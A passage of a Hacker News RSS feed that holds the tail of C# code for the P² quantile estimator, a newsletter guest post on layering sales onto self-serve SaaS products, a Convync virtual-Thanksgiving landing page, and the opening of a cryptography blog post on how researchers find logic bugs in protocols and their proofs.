                <span>ns</span><span>[</span><span>3</span><span>]</span> <span>=</span> <span>2</span> <span>+</span> <span>2</span> <span>*</span> <span>p</span><span>;</span>
                <span>ns</span><span>[</span><span>4</span><span>]</span> <span>=</span> <span>4</span><span>;</span>

                <span>dns</span><span>[</span><span>0</span><span>]</span> <span>=</span> <span>0</span><span>;</span>
                <span>dns</span><span>[</span><span>1</span><span>]</span> <span>=</span> <span>p</span> <span>/</span> <span>2</span><span>;</span>
                <span>dns</span><span>[</span><span>2</span><span>]</span> <span>=</span> <span>p</span><span>;</span>
                <span>dns</span><span>[</span><span>3</span><span>]</span> <span>=</span> <span>(</span><span>1</span> <span>+</span> <span>p</span><span>)</span> <span>/</span> <span>2</span><span>;</span>
                <span>dns</span><span>[</span><span>4</span><span>]</span> <span>=</span> <span>1</span><span>;</span>
            <span>}</span>

            <span>return</span><span>;</span>
        <span>}</span>

        <span>int</span> <span>k</span><span>;</span>
        <span>if</span> <span>(</span><span>x</span> <span>&lt;</span> <span>q</span><span>[</span><span>0</span><span>])</span>
        <span>{</span>
            <span>q</span><span>[</span><span>0</span><span>]</span> <span>=</span> <span>x</span><span>;</span>
            <span>k</span> <span>=</span> <span>0</span><span>;</span>
        <span>}</span>
        <span>else</span> <span>if</span> <span>(</span><span>x</span> <span>&lt;</span> <span>q</span><span>[</span><span>1</span><span>])</span>
            <span>k</span> <span>=</span> <span>0</span><span>;</span>
        <span>else</span> <span>if</span> <span>(</span><span>x</span> <span>&lt;</span> <span>q</span><span>[</span><span>2</span><span>])</span>
            <span>k</span> <span>=</span> <span>1</span><span>;</span>
        <span>else</span> <span>if</span> <span>(</span><span>x</span> <span>&lt;</span> <span>q</span><span>[</span><span>3</span><span>])</span>
            <span>k</span> <span>=</span> <span>2</span><span>;</span>
        <span>else</span> <span>if</span> <span>(</span><span>x</span> <span>&lt;</span> <span>q</span><span>[</span><span>4</span><span>])</span>
            <span>k</span> <span>=</span> <span>3</span><span>;</span>
        <span>else</span>
        <span>{</span>
            <span>q</span><span>[</span><span>4</span><span>]</span> <span>=</span> <span>x</span><span>;</span>
            <span>k</span> <span>=</span> <span>3</span><span>;</span>
        <span>}</span>

        <span>for</span> <span>(</span><span>int</span> <span>i</span> <span>=</span> <span>k</span> <span>+</span> <span>1</span><span>;</span> <span>i</span> <span>&lt;</span> <span>5</span><span>;</span> <span>i</span><span>++)</span>
            <span>n</span><span>[</span><span>i</span><span>]++;</span>
        <span>for</span> <span>(</span><span>int</span> <span>i</span> <span>=</span> <span>0</span><span>;</span> <span>i</span> <span>&lt;</span> <span>5</span><span>;</span> <span>i</span><span>++)</span>
            <span>ns</span><span>[</span><span>i</span><span>]</span> <span>+=</span> <span>dns</span><span>[</span><span>i</span><span>];</span>

        <span>for</span> <span>(</span><span>int</span> <span>i</span> <span>=</span> <span>1</span><span>;</span> <span>i</span> <span>&lt;=</span> <span>3</span><span>;</span> <span>i</span><span>++)</span>
        <span>{</span>
            <span>double</span> <span>d</span> <span>=</span> <span>ns</span><span>[</span><span>i</span><span>]</span> <span>-</span> <span>n</span><span>[</span><span>i</span><span>];</span>
            <span>if</span> <span>(</span><span>d</span> <span>&gt;=</span> <span>1</span> <span>&amp;&amp;</span> <span>n</span><span>[</span><span>i</span> <span>+</span> <span>1</span><span>]</span> <span>-</span> <span>n</span><span>[</span><span>i</span><span>]</span> <span>&gt;</span> <span>1</span> <span>||</span> <span>d</span> <span>&lt;=</span> <span>-</span><span>1</span> <span>&amp;&amp;</span> <span>n</span><span>[</span><span>i</span> <span>-</span> <span>1</span><span>]</span> <span>-</span> <span>n</span><span>[</span><span>i</span><span>]</span> <span>&lt;</span> <span>-</span><span>1</span><span>)</span>
            <span>{</span>
                <span>int</span> <span>dInt</span> <span>=</span> <span>Math</span><span>.</span><span>Sign</span><span>(</span><span>d</span><span>);</span>
                <span>double</span> <span>qs</span> <span>=</span> <span>Parabolic</span><span>(</span><span>i</span><span>,</span> <span>dInt</span><span>);</span>
                <span>if</span> <span>(</span><span>q</span><span>[</span><span>i</span> <span>-</span> <span>1</span><span>]</span> <span>&lt;</span> <span>qs</span> <span>&amp;&amp;</span> <span>qs</span> <span>&lt;</span> <span>q</span><span>[</span><span>i</span> <span>+</span> <span>1</span><span>])</span>
                    <span>q</span><span>[</span><span>i</span><span>]</span> <span>=</span> <span>qs</span><span>;</span>
                <span>else</span>
                    <span>q</span><span>[</span><span>i</span><span>]</span> <span>=</span> <span>Linear</span><span>(</span><span>i</span><span>,</span> <span>dInt</span><span>);</span>
                <span>n</span><span>[</span><span>i</span><span>]</span> <span>+=</span> <span>dInt</span><span>;</span>
            <span>}</span>
        <span>}</span>

        <span>count</span><span>++;</span>
    <span>}</span>
    
    <span>private</span> <span>double</span> <span>Parabolic</span><span>(</span><span>int</span> <span>i</span><span>,</span> <span>double</span> <span>d</span><span>)</span>
    <span>{</span>
        <span>return</span> <span>q</span><span>[</span><span>i</span><span>]</span> <span>+</span> <span>d</span> <span>/</span> <span>(</span><span>n</span><span>[</span><span>i</span> <span>+</span> <span>1</span><span>]</span> <span>-</span> <span>n</span><span>[</span><span>i</span> <span>-</span> <span>1</span><span>])</span> <span>*</span> <span>(</span>
            <span>(</span><span>n</span><span>[</span><span>i</span><span>]</span> <span>-</span> <span>n</span><span>[</span><span>i</span> <span>-</span> <span>1</span><span>]</span> <span>+</span> <span>d</span><span>)</span> <span>*</span> <span>(</span><span>q</span><span>[</span><span>i</span> <span>+</span> <span>1</span><span>]</span> <span>-</span> <span>q</span><span>[</span><span>i</span><span>])</span> <span>/</span> <span>(</span><span>n</span><span>[</span><span>i</span> <span>+</span> <span>1</span><span>]</span> <span>-</span> <span>n</span><span>[</span><span>i</span><span>])</span> <span>+</span>
            <span>(</span><span>n</span><span>[</span><span>i</span> <span>+</span> <span>1</span><span>]</span> <span>-</span> <span>n</span><span>[</span><span>i</span><span>]</span> <span>-</span> <span>d</span><span>)</span> <span>*</span> <span>(</span><span>q</span><span>[</span><span>i</span><span>]</span> <span>-</span> <span>q</span><span>[</span><span>i</span> <span>-</span> <span>1</span><span>])</span> <span>/</span> <span>(</span><span>n</span><span>[</span><span>i</span><span>]</span> <span>-</span> <span>n</span><span>[</span><span>i</span> <span>-</span> <span>1</span><span>])</span>
        <span>);</span>
    <span>}</span>

    <span>private</span> <span>double</span> <span>Linear</span><span>(</span><span>int</span> <span>i</span><span>,</span> <span>int</span> <span>d</span><span>)</span>
    <span>{</span>
        <span>return</span> <span>q</span><span>[</span><span>i</span><span>]</span> <span>+</span> <span>d</span> <span>*</span> <span>(</span><span>q</span><span>[</span><span>i</span> <span>+</span> <span>d</span><span>]</span> <span>-</span> <span>q</span><span>[</span><span>i</span><span>])</span> <span>/</span> <span>(</span><span>n</span><span>[</span><span>i</span> <span>+</span> <span>d</span><span>]</span> <span>-</span> <span>n</span><span>[</span><span>i</span><span>]);</span>
    <span>}</span>

    <span>public</span> <span>double</span> <span>GetQuantile</span><span>()</span>
    <span>{</span>
        <span>if</span> <span>(</span><span>count</span> <span>&lt;=</span> <span>5</span><span>)</span>
        <span>{</span>
            <span>Array</span><span>.</span><span>Sort</span><span>(</span><span>q</span><span>,</span> <span>0</span><span>,</span> <span>count</span><span>);</span>
            <span>int</span> <span>index</span> <span>=</span> <span>(</span><span>int</span><span>)</span> <span>Math</span><span>.</span><span>Round</span><span>((</span><span>count</span> <span>-</span> <span>1</span><span>)</span> <span>*</span> <span>p</span><span>);</span>
            <span>return</span> <span>q</span><span>[</span><span>index</span><span>];</span>
        <span>}</span>

        <span>return</span> <span>q</span><span>[</span><span>2</span><span>];</span>
    <span>}</span>
<span>}</span>
</code></pre></div><h3 id="conclusion">Conclusion</h3><p>The P² quantile estimator allows estimating quantile values on a stream of numbers without storing individual …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://aakinshin.net/posts/p2-quantile-estimator/">https://aakinshin.net/posts/p2-quantile-estimator/</a></em></p>]]>
            </description>
            <link>https://aakinshin.net/posts/p2-quantile-estimator/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25201093</guid>
            <pubDate>Tue, 24 Nov 2020 18:06:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to layer sales onto a bottom-up self-serve product]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25200913">thread link</a>) | @jcs87
<br/>
November 24, 2020 | https://www.lennyrachitsky.com/p/sales-bottom-up | <a href="https://web.archive.org/web/*/https://www.lennyrachitsky.com/p/sales-bottom-up">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><em>👋 Hello, I’m&nbsp;<a href="https://twitter.com/lennysan">Lenny</a>&nbsp;and welcome to a ✨&nbsp;<strong>once-a-month-free-edition&nbsp;</strong>✨ of my newsletter. Each week I humbly tackle reader questions about product, growth, working with humans, and anything else that’s stressing them out at the office.</em></p><p><em>If you’re not a paid subscriber, here’s what you missed this month:</em></p><ol><li><p><a href="https://www.lennyrachitsky.com/p/magical-growth-loops">Magical growth loops</a></p></li><li><p><a href="https://www.lennyrachitsky.com/p/managing-up">How to manage up</a></p></li><li><p><a href="https://www.lennyrachitsky.com/p/product-management-startup-big-company">Startup PM vs. big company PM</a></p></li></ol><blockquote><h2>Q: I have a self-serve bottom-up SaaS product, and I'm trying to decide if, when, and how I should hire my first full-time salesperson.</h2></blockquote><p>One of the most surprising takeaways from <a href="https://www.lennyrachitsky.com/p/how-todays-fastest-growing-b2b-businesses-b11">my research into early B2B growth</a> was that <strong>100% of the bottom-up B2B companies ended up layering on a sales team</strong>. It’s rarely a question of if — it’s a question of when, and how.</p><p>Since I don’t have a lot of depth in sales myself, I went straight to my go-to person for all things sales: <a href="https://twitter.com/Kazanjy">Pete Kazanjy</a>. If you don’t know of Pete, he wrote <a href="https://www.foundingsales.com/">THE book on startup sales</a>, which he recently released as a physical book. This tweet was not an exaggeration:</p><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F7c5ce225-1f4f-47eb-afe6-1da59ed276f5_1190x756.png"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F7c5ce225-1f4f-47eb-afe6-1da59ed276f5_1190x756.png" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/7c5ce225-1f4f-47eb-afe6-1da59ed276f5_1190x756.png&quot;,&quot;height&quot;:756,&quot;width&quot;:1190,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:1236090,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null}" alt=""></a></figure></div><p>Pete generously agreed to write a guest post, and unsurprisingly, <strong>below you’ll find the most in-depth and tactical guide for adding sales into your org. </strong>Including<strong>:</strong></p><ol><li><p>Should I start with a self-serve product?</p></li><li><p>Should I ever involve salespeople?</p></li><li><p>When should I add a salesperson to the mix?</p></li><li><p>How do I set myself up for success during The Transition?</p></li><li><p>Common pitfalls to avoid</p></li></ol><p>Let’s dive in!</p><p><em>A bit more about Pete: In addition to authoring <a href="https://www.foundingsales.com/">Founding Sales</a>, Pete Kazanjy is also the founder of <a href="https://www.atriumhq.com/">Atrium</a>, makers of <a href="https://www.atriumhq.com/">data-driven management software for sales teams</a>, and founder of <a href="https://modernsaleshq.com/">Modern Sales</a> (the world’s largest peer-education community for sales operations and leadership professionals). He previously started and sold TalentBin (a recruiting software startup) to Monster Worldwide. You can find him on <a href="https://twitter.com/Kazanjy">Twitter</a> and <a href="https://www.linkedin.com/in/kazanjy/">LinkedIn</a>.</em></p><h2><strong>The Transition: </strong>Layering Sales onto a Bottom-Up Self-Serve Product</h2><p><em>By Pete Kazanjy</em></p><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F91b85976-c55f-4f8a-9d16-2b3807f40e6a_2150x1171.png"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F91b85976-c55f-4f8a-9d16-2b3807f40e6a_2150x1171.png" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/91b85976-c55f-4f8a-9d16-2b3807f40e6a_2150x1171.png&quot;,&quot;height&quot;:793,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:180377,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null}" alt=""></a></figure></div><p>“Bottom-up” (or “product-led”) B2B growth is a hot topic in early-stage circles these days, and it makes sense why. A self-serve (“easy-in”) entry motion, that’s later combined with a strong direct sales motion, can make for explosive revenue growth as shown by IPO’d exemplars Zoom, Slack, Datadog, and private market dynamos like Airtable, Figma, and others. The combination of bottom-up self-serve plus direct sales can simultaneously lower CACs and power larger contract values (with expansion into enterprise contracts). This would never be possible in a pure self-serve model.</p><p><strong>The crux of this article is that waiting too long to add sales-involvement often leads to a large opportunity cost.</strong> Many successful self-serve applications saw their market position usurped by competitors who adopted a sales-assisted motion and effectively firewalled the self-serve-only products out of lucrative enterprise segments (e.g. Dropbox).</p><p>Below, I’ll help you understand if layering in sales is right for your business, when to take the leap, and how to navigate this critical transition successfully:</p><h2>First of all, should I even start with a self-serve product?</h2><p>Self-serve has a lot going for it, but it’s not necessarily a slam dunk decision for every product. Below are four questions to take into consideration before building a self-serve product (many of which can be answered before you launch):</p><h4><strong>1. Is the product simple enough for self-serve?&nbsp;</strong></h4><p>Successful self-service is about allowing a user to get to success and have that “aha” activation moment on their own. So the question that follows from this is how easy is it for users to get to that <em>aha</em> moment? Zoom is not complicated. Send someone a link or join someone’s link, and boom, you’re talking to them. Dropbox is pretty straight forward – download this client, and tell it what folders to sync. Airtable is a bit more advanced, but you can start simple, and they’ve invested heavily in a content catalog of templates and recipes to allow for self-served advancement.</p><p>Note, “complexity” is audience contingent. Tableau is not an easy product to use by any stretch of the imagination, but it’s self-serviceable by the technical data analysts for whom it was designed, and as such started self-serve with a desktop client download. Similarly, Stripe, Datadog, Twilio, New Relic, and other developer tools have all started self-serve, in that their technical audience has the capacity to self-serve even these more involved products. Some offerings are really just too complex to start self-serve, such as enterprise-grade marketing automation platforms like <a href="https://www.marketo.com/">Marketo</a>,&nbsp; and software targeting massive financial enterprises like <a href="https://blend.com/">Blend</a>.</p><h4><strong>2. Is this truly new and differentiated?&nbsp;</strong></h4><p>If your offering is truly new and differentiated, self-serve can be fantastic. When <a href="https://www.yesware.com/">Yesware</a> and <a href="https://www.mixmax.com/">Mixmax</a> first launched, most organizations didn’t have any sort of sales engagement email offerings for their salespeople. The notion of sending someone a link to a public calendar with which to book time was crazy talk when <a href="https://calendly.com/">Calendly</a> first launched. Software that proactively monitors your revenue stack’s automations and linkages for errors has never existed, which is why <a href="https://seesonar.com/">Sonar</a> can be self-serviced by sales and marketing operations staff. Personal business cloud app search has never existed before, and thus there’s no reason for a given user in an organization to not download and give <a href="https://getcommande.com/">Command E</a> a try.</p><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F8bdaeb77-d849-4833-aeb9-3add8098b57c_1017x574.png"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F8bdaeb77-d849-4833-aeb9-3add8098b57c_1017x574.png" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/8bdaeb77-d849-4833-aeb9-3add8098b57c_1017x574.png&quot;,&quot;height&quot;:574,&quot;width&quot;:1017,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:null,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:null}" alt=""></a></figure></div><h4><strong>3. Can this co-exist with a (less good) incumbent in a given company’s stack?</strong></h4><p>Conversely, if your offering can coexist alongside inferior incumbents, self-serve can also work. Most organizations where Slack was adopted early-on already had Gmail and thus GChat. Organizations that start using <a href="https://www.getguru.com/">Guru</a> may have antiquated knowledge bases in Sharepoint or in Confluence wikis. This is where my company, <a href="https://www.atriumhq.com/">Atrium</a> lives. Customers will frequently have legacy analytics infrastructure, like Tableau or Looker, in place, but its complexity underserves the needs of the sales organization, leaving open an opportunity for Atrium to enable data-driven management for sales managers and sales operations staff in a way they’re currently not doing. Tableau and Looker still end up existing in the organization, but for more advanced analytics run by a data or analytics team.</p><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fa4948801-3ec0-4078-9e3e-ef583adfe8d8_1017x575.png"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fa4948801-3ec0-4078-9e3e-ef583adfe8d8_1017x575.png" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/a4948801-3ec0-4078-9e3e-ef583adfe8d8_1017x575.png&quot;,&quot;height&quot;:575,&quot;width&quot;:1017,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:null,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:null}" alt=""></a></figure></div><p>By contrast, an “end to end” offering like a Human Resource Information System (e.g. Workday) or email sending platforms (e.g. Iterable) are not something you have “two of” in an organization. As such, even though <a href="https://www.saplinghr.com/">Sapling</a> makes delightful modern HRIS software, they don’t have a self-serve offering. <a href="https://iterable.com/">Iterable</a> makes great, modern customer engagement software, but it’s highly unlikely an organization would run a legacy system like <a href="https://www.oracle.com/cx/marketing/campaign-management/">Responsys</a> and Iterable side by side. Self-serve would likely not work for them.&nbsp;</p><h4><strong>4. Will you focus on small organizations?</strong></h4><p>If none of the above apply, you can still target smaller orgs that have not yet adopted a legacy provider with a self-service offering. <a href="https://stripe.com/">Stripe</a> is a great example here. Payments providers already existed when Stripe first came on the scene, so it was less likely for a mature e-commerce provider with an existing payments provider to switch to a new upstart. But because legacy providers were clunky with poorly documented APIs, Stripe was the obvious choice for new internet businesses who didn’t yet have a payments provider.</p><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F57067d98-1583-4066-9827-5d27fffba73e_1012x569.png"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F57067d98-1583-4066-9827-5d27fffba73e_1012x569.png" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/57067d98-1583-4066-9827-5d27fffba73e_1012x569.png&quot;,&quot;height&quot;:569,&quot;width&quot;:1012,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:null,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:null}" alt=""></a></figure></div><p><a href="https://www.revops.io/">RevOps</a> makes fantastic quoting software for sales organizations that can be self-setup, but there’s no way anyone who already has Salesforce CPQ or Apttus is going to switch over to them. But for a 10 person sales organization that wants to systemize the creation of quotes and sending proposals, the idea of solving that problem in less than 5 minutes (rather than 3 months, like a standard Salesforce CPQ deployment) is really attractive. Which is why self-serve works for RevOps, specifically targeting this down-market segment.</p><h2><strong>Should I</strong> ever involve salespeople?&nbsp;</h2><p>Once you’ve determined whether self-serve is right for you, growth is going well, and you’re on your merry way (i.e. people are self-serving, getting to “aha”, transacting, and retaining), the next question would be “OK, well, should we get some salespeople involved here?” Well, that depends.</p><p>There are two primary reasons to add salespeople to a self-serve commercial motion:</p><ol><li><p>To facilitate the <strong>penetration or expansion</strong> of your solution into an organization where it has an initial foothold, and/or&nbsp;</p></li><li><p>To help <strong>raise conversion</strong> rates of your self-serve offer&nbsp;</p></li></ol><p>It turns out, humans are <em>really<strong> </strong></em>helpful when it comes to smoothing over weird edge cases, communicating complicated concepts, and persuading other people to surmount their inertia and try a new thing. They’re good at, you know, selling! But there’s a downside. Humans are expensive, and can only do so many tasks in a given amount of time - as compared to software which, once written, is really cheap to run, and can be scaled up to do as many tasks as you like. </p><p>So the question of “should I add sales to the mix?” is one of “will it help?” and “will the juice be worth the squeeze?”</p><h4><strong>1. Facilitating the penetration or expansion into an organization</strong></h4><p>This is the approach Slack and Zoom’s early sales motions helped with. It <em>wasn’t</em> about a salesperson showing up to an organization and saying “Hi, you need intra-organizational communication assistance, you should check out Slack.” Rather, teams within organizations might start using Slack to communicate amongst themselves, and the addition of an “Account Manager” (psssst...it’s a salesperson) helped unify those various pods into a single contract, while potentially adding more pods, was powerful. Similarly, in a more “single-player” offering, like <a href="https://getcommande.com/">Command E</a>, a handful of sales people in a 200 person sales organization might start using it to search their Salesforce opportunities, their Google Docs, and their Gmail, but a “Customer Success Specialist” (psssst...it’s a salesperson) offering to “give a personalized tour to the rest of the sales organization” could also be quite powerful (for expansion).</p><h4><strong>2. Helping with conversion</strong></h4><p>Sometimes even supposedly simplistic offerings …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.lennyrachitsky.com/p/sales-bottom-up">https://www.lennyrachitsky.com/p/sales-bottom-up</a></em></p>]]>
            </description>
            <link>https://www.lennyrachitsky.com/p/sales-bottom-up</link>
            <guid isPermaLink="false">hacker-news-small-sites-25200913</guid>
            <pubDate>Tue, 24 Nov 2020 17:50:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Convync is offering a free Zoom alternative to virtual Thanksgiving gatherings]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25200912">thread link</a>) | @xzhao254
<br/>
November 24, 2020 | https://www.convync.com/thanksgiving/ | <a href="https://web.archive.org/web/*/https://www.convync.com/thanksgiving/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="detail-content">
        <h2>Invite your friends and family to the ultimate virtual Thanksgiving</h2>
        <p>Sign up below to generate a shareable link to your free,
            personal virtual dining room for up to 8 family and friends,
            no download necessary.
        </p>
        
    </div><div id="faq">
        <div>
            <div>
                <h3>What is this virtual dining room?</h3>
                <p>
                    It’s essentially a group video chat platform that takes place around
                    a virtual dining table. It’s like Zoom, but without the fatigue,
                    and with a delicious virtually baked turkey in the middle.
                </p>
            </div>
            <div>
                <h3>What is Convync?</h3>
                <p>
                    Convync is a collaboration platform where remote
                    teams can convene and sync in “virtual offices”.
                    It is a delightful alternative to existing communication
                    platforms and emphasizes real-time video and voice
                    communication for a better, more inclusive remote work
                    experience. Watch the demo video below or check out our
                    <a href="https://www.convync.com/">homepage</a>
                    for more information.
                </p>
                <iframe src="https://www.youtube.com/embed/tjcdGU_KgsA" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen="">
                </iframe>
            </div>
            <div>
                <h3>Who are we?</h3>
                <p>
                    We are a group of friends who met in college who are now trying
                    to build a company. Check us out on LinkedIn!
                </p>
                <p><a href="https://www.linkedin.com/in/xzhao16/">
                        <img id="profile__image" src="https://www.convync.com/static/images/thanksgiving/kevin.png" alt="Kevin">
                    </a>
                    <a href="https://www.linkedin.com/in/vivekgaddam/">
                        <img id="profile__image" src="https://www.convync.com/static/images/thanksgiving/vivek.png" alt="Vivek">
                    </a>
                    <a href="https://www.linkedin.com/in/desmond-caulley-bb64646b/">
                        <img id="profile__image" src="https://www.convync.com/static/images/thanksgiving/desmond.png" alt="Desmond">
                    </a>
                    <a href="https://www.linkedin.com/in/huynie/">
                        <img id="profile__image" src="https://www.convync.com/static/images/thanksgiving/huy.png" alt="Huy">
                    </a>
                </p>
            </div>
            <div>
                <h3>Is it secure?</h3>
                <p>
                    We built security into Convync ever since its inception.
                    All voice, video, and data communications
                    are peer-to-peer and fully encrypted. We use WebRTC,
                    a modern protocol for real-time communications used
                    by companies worldwide.
                </p>
            </div>
            <div>
                <h3>What devices are supported?</h3>
                <p>
                    Convync is currently supported on both MacOS and Windows using
                    your favorite browser. Mobile support is coming in the future.
                </p>
            </div>
            <div>
                <h3>
                    I would like to try out Convync at work, how can I sign up to beta test?
                </h3>
                <p>
                    You can beta test for free and create your own virtual office by following the steps in this
                    <a href="https://www.convync.com/accounts/getstarted/">link</a>. Feel free to also get in touch
                    with us at <a href="mailto:xz@convync.com">xz@convync.com</a>.
                </p>
            </div>
            <div>
                <h3>I have some ideas and suggestions for you, how can I get in touch?</h3>
                <p>
                    We would love to hear from you.
                    Hit us up at <a href="mailto:xz@convync.com">xz@convync.com</a> or contact us through <a href="https://www.linkedin.com/company/convync-inc">LinkedIn</a> &amp;
                    <a href="https://twitter.com/convync">Twitter</a>
                </p>
            </div>
        </div>
    </div></div>]]>
            </description>
            <link>https://www.convync.com/thanksgiving/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25200912</guid>
            <pubDate>Tue, 24 Nov 2020 17:50:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How do people find bugs?]]>
            </title>
            <description>
<![CDATA[
Score 38 | Comments 7 (<a href="https://news.ycombinator.com/item?id=25200893">thread link</a>) | @bitwizzle
<br/>
November 24, 2020 | https://cryptologie.net/article/511/how-do-people-find-bugs/ | <a href="https://web.archive.org/web/*/https://cryptologie.net/article/511/how-do-people-find-bugs/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>

<p>You might wonder how people find bugs. Low-hanging fruit bugs can be found via code review, static analysis, dynamic analysis (like fuzzing), and other techniques. But what about deep logic bugs. Those you can’t find easily. Perhaps the protocol implemented is quite complicated, or correctness is hard to define, and edge-cases hard to detect. One thing I’ve noticed is that re-visiting protocols are an excellent way to find logic bugs.</p>
<p>Ian Miers once said something like that: "you need time, expertise, and meaningful engagement”. I like that sentence, although one can point out that these traits are closely linked--you can’t have meaningful engagement without time and expertise--it does show that finding bugs take "effort".</p>
<p>OK. Meaningful engagement can lead to meaningful bugs, and meaningful bugs can be found at different levels.
So you're here, seating in your undies in the dark, with a beer on your side and some uber eats lying on the floor.
Your computer is staring back at you, blinking at a frequency you can't notice, and waiting for you to find a bug in this protocol.
What do you do?
Perhaps the protocol doesn't have a proof, and this leads you to wonder if you can write one for it...</p>
<p>It worked for Ariel Gabizon, who in 2018 <a href="https://electriccoin.co/blog/zcash-counterfeiting-vulnerability-successfully-remediated/">found a subtle error</a> in a <a href="https://eprint.iacr.org/2013/879">2013 zk-SNARK paper</a> used by the Zcash cryptocurrency he was working on.
He found it by trying to write a proof for the paper he was reading, realizing that the authors had winged it.
While protocols back in the days could afford to wing it, these days people are more difficult--they demand proofs.
The bug Ariel found could have allowed anyone to forge an unlimited amount of money undetected.
It was silently fixed months later in an upgrade to the network.</p>
<blockquote>
<p>Ariel Gabizon, a cryptographer employed by the Zcash Company at the time of discovery, uncovered a soundness vulnerability. The key generation procedure of [BCTV14], in step 3, produces various elements that are the result of evaluating polynomials related to the statement being proven. Some of these elements are unused by the prover and were included by mistake; but their presence allows a cheating prover to circumvent a consistency check, and thereby transform the proof of one statement into a valid-looking proof of a different statement. This breaks the soundness of the proving system.</p>
</blockquote>
<p>What if the protocol already had a proof though?
Well that doesn't mean much, people enjoy writing unintelligible proofs, and people make errors in proofs all the time.
So the second idea is that reading and trying to understand a proof might lead to a bug in the proof.
Here's some meaningful engagement for you.</p>
<p>In 2001, Shoup revisited some proofs and <a href="https://eprint.iacr.org/2000/060.pdf">found some darning gaps in the proofs for RSA-OAEP</a>, leading to a newer scheme OAEP+ which was never adopted in practice.
Because back then, as I said, we really didn't care about proofs.</p>
<blockquote>
<p>[BR94] contains a valid proof that OAEP satisfies a certain technical property which they call “plaintext awareness.” Let us call this property PA1. However, it is claimed without proof that PA1 implies security against chosen ciphertext attack and non-malleability. Moreover, it is not even clear if the authors mean adaptive chosen ciphertext attack (as in [RS91]) or indifferent (a.k.a. lunchtime) chosen ciphertext attack (as in [NY90]).</p>
</blockquote>
<p>Later in 2018, a series of discoveries on the proofs for the OCB2 block cipher quickly led to <a href="https://eprint.iacr.org/2019/311">practical attacks breaking the cipher</a>.</p>
<blockquote>
